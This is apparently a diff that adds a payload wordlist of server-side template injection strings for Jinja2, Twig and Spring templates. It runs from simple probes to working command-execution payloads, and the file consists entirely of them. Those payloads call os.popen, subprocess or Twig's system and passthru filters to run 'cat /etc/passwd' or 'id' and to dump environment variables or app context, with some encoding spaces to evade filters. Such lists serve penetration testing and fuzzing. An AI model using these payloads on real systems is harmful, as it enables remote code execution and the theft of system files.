@@ -1,0 +1,39 @@
+{{4*4}}[[5*5]]
+{{7*'7'}}
+{{config.items()}}
+${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}
+${7*7}
+${{7*7}}
+${class.getClassLoader()}
+${class.getResource("").getPath()}
+${class.getResource("../../../../../index.htm").getContent()}
+${T(java.lang.System).getenv()}
+{{ [].class.base.subclasses() }}
+{{''.class.mro()[1].subclasses()}}
+{{ ''.__class__.__mro__[2].__subclasses__() }}
+{{ self.__init__.__globals__.__builtins__ }}
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
+{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/etc/passwd").read() }}
+{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
+{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat /etc/passwd').read() }}
+{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('cat /etc/passwd').read() }}
+{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('cat /etc/passwd').read() }}
+{{ cycler.__init__.__globals__.os.popen('cat /etc/passwd').read() }}
+{{ joiner.__init__.__globals__.os.popen('cat /etc/passwd').read() }}
+{{ namespace.__init__.__globals__.os.popen('cat /etc/passwd').read() }}
+{{ lipsum.__globals__["os"].popen('cat /etc/passwd').read() }}
+{{''.__class__.mro()[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()[0].strip()}}
+{{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}
+{{dump(app)}}
+{{dump(_context)}}
+{{app.request.server.all|join(',')}}
+{{self}}
+{{['cat /etc/passwd']|filter('system')}}
+{{[0]|reduce('system','cat /etc/passwd')}}
+{{['cat /etc/passwd']|map('system')|join}}
+{{['cat /etc/passwd',1]|sort('system')|join}}
+{{['cat\x20/etc/passwd']|filter('system')}}
+{{['cat$IFS/etc/passwd']|filter('system')}}
+{{['cat /etc/passwd']|filter('passthru')}}
+{{['cat /etc/passwd']|map('passthru')}}
